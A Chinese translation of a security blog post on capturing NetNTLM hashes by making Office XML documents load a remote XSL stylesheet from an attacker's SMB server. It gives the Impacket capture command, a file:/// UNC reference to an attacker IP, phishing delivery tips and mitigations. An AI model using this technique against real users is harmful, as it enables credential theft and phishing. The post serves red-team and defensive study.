> 原文链接: https://www.anquanke.com//post/id/154116 


# 利用 Office XML 文档捕获 NetNTLM 哈希值


                                阅读量   
                                **132756**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者bohops，文章来源：bohops.com
                                <br>原文地址：[https://bohops.com/2018/08/04/capturing-netntlm-hashes-with-office-dot-xml-documents/](https://bohops.com/2018/08/04/capturing-netntlm-hashes-with-office-dot-xml-documents/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p5.ssl.qhimg.com/t018112f348c3838f77.png)](https://p5.ssl.qhimg.com/t018112f348c3838f77.png)

## TL; DR

Office XML（.xml）文档可以通过SMB调用远程XSL样式表。如果远程XSL样式表位于攻击者控制的服务器，则可获取被攻击用户的net-NTLM身份验证哈希值（质询/响应消息）。后续操作上，攻击者可以离线破解此哈希值, 或利用其他技术进行远程命令执行（如果用户权限足够且联网）。如果被攻击目标安全性比较差（例如出网规则较差），还可能据此对用户发动网络钓鱼攻击。在许多情况下，XML文档可能会通过大多数邮件网关过滤机制和/或其他网络安全控制。防御者可能需要将默认XML文件关联更改为文本编辑器，因为大多数用户都不会有打开原始Office XML文档的需求。强密码，可靠的出网规则（例如，禁止SMB出网流量）和用户培训, 可以帮助缓解这些类型的攻击。



## 介绍

捕获netNTLM（版本1或版本2）质询/响应消息哈希值的方法网上有不少，利用/破解netNTLM哈希值的工具也有很多, 且都很棒, 例如CoreSecurity的[Impacket](https://github.com/CoreSecurity/impacket)，Laurent Gaffie的[Responder](https://github.com/SpiderLabs/Responder)，[@kevin_robertson](https://github.com/kevin_robertson)的[Inveigh](https://github.com/Kevin-Robertson/Inveigh)，以及Jens Steube的[Hashcat](https://github.com/hashcat/hashcat)。在大多数情况下，这些捕获技术都可以归类为后渗透(post-exploitation)技术，并且通常需要主机联网和/或能访问主机才能成功。在适当的情况下，这些技术可以由用户驱动（例如，通过Microsoft Office文档），并且很可能成为攻击者登录用户主机的切入点。在这篇文章中，我们将讨论一种非常规技术: 使用Microsoft Office（Word）2016进行UNC路径重定向并捕获netNTLM。内容包括：
- Microsoft XML文档的入门介绍
- 通过操作XML样式表捕获NetNTLM
- 用例，注释和警告
- 如何防范此类攻击
** *注意 **：在继续阅读之前，我强烈建议您查看以下资源，以获取有关Windows身份验证协议和相关捕获方法的信息：
<li>
[LM, NTLM, Net-NTLMv2, oh my!](https://medium.com/p/a9b235c58ed4)
</li>
<li>
[Microsoft Office – NTLM Hashes via Frameset](https://pentestlab.blog/2017/12/18/microsoft-office-ntlm-hashes-via-frameset/)
</li>
<li>
[SMB/HTTP Auth Capture via SCF File](https://room362.com/post/2016/smb-http-auth-capture-via-scf/)
</li>
<li>
[Places of Interest in Stealing NetNTLM Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
</li>
<li>
[Microsoft Word – UNC Path Injection with Image Linking](https://blog.netspi.com/microsoft-word-unc-path-injection-image-linking/)
</li>


## Microsoft XML文档的入门介绍

从 Office 2007开始，（大多数）文档格式都是基于微软的Office Open XML（OOXML），它是“由微软开发的用于表示电子表格，图表，演示文稿和文字处理文档的基于XML的压缩文件格式”（[维基百科](https://en.wikipedia.org/wiki/Office_Open_XML)）。从“较新的”office扩展名，例如Microsoft Word的.docx和Excel的.xslx，就可以看得出来。

非常有趣的是，Office文档也可以看做包含有效标记和属性的“flat”XML文件。例如，让我们打开MS Word 2016, 并添加一些文本, 创建一个传统意义上的Word XML文档：

[![](https://bohops.files.wordpress.com/2018/08/01_word_doc_create.png?w=768)](https://bohops.files.wordpress.com/2018/08/01_word_doc_create.png?w=768)

将文件保存为XML格式，不要选.docx：

[![](https://bohops.files.wordpress.com/2018/08/02_word_doc_save_as_xml.png?w=768)](https://bohops.files.wordpress.com/2018/08/02_word_doc_save_as_xml.png?w=768)

以下是该文档的（截断的）XML表示：

[![](https://bohops.files.wordpress.com/2018/08/03_word_xml.png?w=768)](https://bohops.files.wordpress.com/2018/08/03_word_xml.png?w=768)

点击上面的图片查看大图。有趣的是，有一个包含**mso-application** label 的标签：

`&lt;?mso-application progid="Word.Document"?&gt;`

ProgID实际上是一个COM标识符。Microsoft XML Handler（MSOXMLED.EXE）处理mso-application标记以加载由ProgID标识的相应Office应用程序。可以直接调用MSOXMLED.EXE来启动相应的XML文件：

`MSOXMLED.EXE /verb open "C:UsersuserDesktopword.xml"`

或者，用户可以直接启动XML文件（在资源管理器中）并交由文件默认关联的处理程序来处理。如果未设置默认文件关联（Windows 10默认未设置），资源管理器将调用runonce.exe, 由用户来选择Office程序。Office XML Hanlder 是第一个（也是首选）选项，一旦选中，Office XML Hanlder 将成为XML文件的默认处理程序：

[![](https://bohops.files.wordpress.com/2018/08/09_first_time_open_office_xml_handler.png?w=768)](https://bohops.files.wordpress.com/2018/08/09_first_time_open_office_xml_handler.png?w=768)

Office XML Handler 调用Word（winword.exe）来打开文档：

[![](https://bohops.files.wordpress.com/2018/08/saved_doc.png?w=768)](https://bohops.files.wordpress.com/2018/08/saved_doc.png?w=768)

*注意：还有其他的方式, 例如从Word种打开XML文件，或直接使用命令行。这些方法会“绕过”关联的处理程序。



## 通过操作XML样式表捕获NetNTLM

从Christian Nagel 2004年发表的[文章](http://weblogs.thinktecture.com/cnagel/xml/)中，我提取了一个简单的Word XML文档和样式表，修改后作为此攻击方式的PoC。以下，是修改的本地XML文件（引用了一个远程服务器的XSL文件）：

[![](https://bohops.files.wordpress.com/2018/08/04_xml_with_xsl_href.png?w=768)](https://bohops.files.wordpress.com/2018/08/04_xml_with_xsl_href.png?w=768)

此XML文件的xml-stylesheet标签包含远程位置的引用（href）。此外，我们添加了mso-application标签，以确保处理程序会将XML文档交由适当的应用程序。

在尝试打开此文件之前，让我们在攻击计算机上启动Impacket SMB服务器：

`smbserver.py -smb2support test .`

[![](https://bohops.files.wordpress.com/2018/08/06_smb_server_setup.png?w=768)](https://bohops.files.wordpress.com/2018/08/06_smb_server_setup.png?w=768)

双击我们的’恶意’XML文件, 打开：

[![](https://bohops.files.wordpress.com/2018/08/07_open_word.png?w=768)](https://bohops.files.wordpress.com/2018/08/07_open_word.png?w=768)

现在，看看我们的SMB服务器日志来检查结果：

[![](https://bohops.files.wordpress.com/2018/08/11_captured_nethash.png?w=768)](https://bohops.files.wordpress.com/2018/08/11_captured_nethash.png?w=768)

成功了。我们现在可以尝试破解这个哈希！



## 用例，注释和注意事项

### <a class="reference-link" name="%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E7%9A%84%E5%BD%B1%E5%93%8D"></a>网络钓鱼的影响

根据具体情况，XML文件可通过某种网络钓鱼技术来部署。如果攻击目标对远程用户的出网过滤规则或VPN控制较弱，则攻击者可以将Office XML文档作为电子邮件附件发送给被攻击者, 电子邮件很可能“在邮件网关和扫描雷达的眼皮子底下”有惊无险的抵达对方的邮件收件箱：

[![](https://bohops.files.wordpress.com/2018/08/phish_1.png?w=768)](https://bohops.files.wordpress.com/2018/08/phish_1.png?w=768)

双击并按“打开”。

**注意**：根据具体情况，用户可能必须逐步点击默认关联的提示框。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://bohops.files.wordpress.com/2018/08/phish_2.png?w=768)

因为该文件来自其他位置（例如Web），Word会在[受保护视图](https://support.office.com/en-us/article/what-is-protected-view-d6f09ac7-e6b9-4495-8e43-2bbcdbcb6653)中打开。一旦我们“启用编辑”，就会从远程服务器获取XSL文档，于是我们就可以在攻击机上收集用户的NetNTLM哈希值：

[![](https://bohops.files.wordpress.com/2018/08/phish_3.png?w=768)](https://bohops.files.wordpress.com/2018/08/phish_3.png?w=768)

### <a class="reference-link" name="%E6%A0%B7%E5%BC%8F%E8%A1%A8%E5%8F%82%E8%80%83%E6%A0%87%E8%AE%B0"></a>样式表参考标记

在上面的示例中，我们使用显式UNC路径来引用样式表。使用file:///协议也可以：

`file:///192.168.245.175/test/word.xsl`

### <a class="reference-link" name="%E5%85%B6%E4%BB%96Microsoft%20Office%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F"></a>其他Microsoft Office应用程序

此种远程加载样式表的方式也适用于其他Office应用程序（例如Excel）。Word似乎是最简单的。

### <a class="reference-link" name="WebDAV"></a>WebDAV

Microsoft Word支持WebDAV协议。如果Word通过SMB协议无法获取远程样式表，Word将尝试使用HTTP WebDAV请求获取远程文件。Didier Stevens（[Webdav Traffic to Malicious-Sites](https://blog.didierstevens.com/2017/11/13/webdav-traffic-to-malicious-sites/)。

*注意：如果使用NTLM WebDAV进行身份验证失败，服务器通常会返回401（表示操作未经授权）。不同的WebDAV客户端，处理此问题的方式也多种多样。Explorer.exe会提示用户输入凭据，而Word似乎会无弹框的情况下多请求几次资源。这种行为非常有意思，但我无法强制传递NTLM请求到服务器。此课题改天再做研究。



## 如何防范此类攻击
<li>
**强密码策略** – 使用唯一的强密码，最大限度地减少攻击者破解收集到的NetNTLM哈希值的机会。</li>
<li>
**文件关联** – 除非真的有业务需求，否则请考虑将XML文件的默认关联程序更改为文本编辑器。此微软官方[文档](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc754587)提供了使用GPO/GPP配置“文件类型首选项”的指南。</li>
<li>
**出网规则** – 出网流量，尤其是SMB（TCP 139/445）对任何组织（或家庭）都是危险的。强制执行出网防火墙规则, 并仅开放实际需要的端口。</li>
<li>
**（远程）用户** – 但是Webmail或VPN, 但不通过隧道传输所有流量的远程用户, 可能面临此类攻击（以及其他类似攻击）的威胁。如果可能，尝试收紧远程访问控制策略, 并通过VPN隧道传输流量。最重要的是，训练用户打开邮件附件时务必小心谨慎。</li>


## 结论

感谢您抽出宝贵时间阅读这篇文章！与往常一样，如果您有任何问题/反馈，请随时给我发消息。

– <a>@bohops</a>
